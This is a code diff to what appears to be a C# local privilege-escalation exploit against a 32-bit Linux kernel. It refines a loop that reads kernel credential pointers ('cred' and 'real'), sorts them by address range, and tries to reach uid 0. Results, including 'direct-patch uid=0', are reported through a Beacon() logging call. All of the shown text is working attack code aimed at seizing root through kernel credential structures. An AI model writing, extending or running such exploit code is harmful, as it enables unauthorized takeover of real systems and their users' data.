@@ -1185,7 +1185,8 @@ internal static class Program
                     // re-roll.  sawLow keeps a low-but-write-failed cred on the
                     // normal retry/scan path.
                     bool sawLow = false, highAlloc = false;
-                    uint highParent = 0, highCred = 0;
+                    uint highParent = 0, highCred = 0, highReal = 0;
+                    bool highJunk = false;
                     for (int pr = 0; pr < 8 && getuid() != 0; pr++)
                     {
                         DropPages();
@@ -1218,18 +1219,30 @@ internal static class Program
                             {
                                 highAlloc = true;
                                 highParent = parent;
-                                // log the word actually read, even if it is not
-                                // a pointer (the old code logged 0 for this case)
+                                // log both words actually read, even if they are
+                                // not pointers; junk=1 marks the C0..DF window
+                                // that used to veto the gate via sawLow
                                 highCred = cred;
+                                highReal = real;
+                                if ((Kptr(cred) && cred < 0xE0000000) ||
+                                    (Kptr(real) && real < 0xE0000000))
+                                    highJunk = true;
                             }
                             if (!parentHigh && Kptr(cred))
                             {
-                                if (cred >= 0xE0000000) { highAlloc = true; highCred = cred; }
+                                if (cred >= 0xE0000000)
+                                {
+                                    highAlloc = true; highCred = cred; highReal = real;
+                                }
                                 else sawLow = true;
                             }
                             if (!parentHigh && Kptr(real))
                             {
-                                if (real >= 0xE0000000) { highAlloc = true; highCred = real; }
+                                if (real >= 0xE0000000)
+                                {
+                                    highAlloc = true; highReal = real;
+                                    if (highCred == 0) highCred = cred;
+                                }
                                 else sawLow = true;
                             }
                             uint u = CredUid(cred);
@@ -1300,7 +1313,9 @@ internal static class Program
                     if (highAlloc && !sawLow && fastMode && getuid() != 0)
                     {
                         Beacon("high-alloc parent=" + highParent.ToString("x8") +
-                               " cred=" + highCred.ToString("x8") + " fast-exit");
+                               " cred=" + highCred.ToString("x8") +
+                               " real=" + highReal.ToString("x8") +
+                               " junk=" + (highJunk ? 1 : 0) + " fast-exit");
                         break;
                     }
                     if (getuid() == 0) Beacon("direct-patch uid=0");
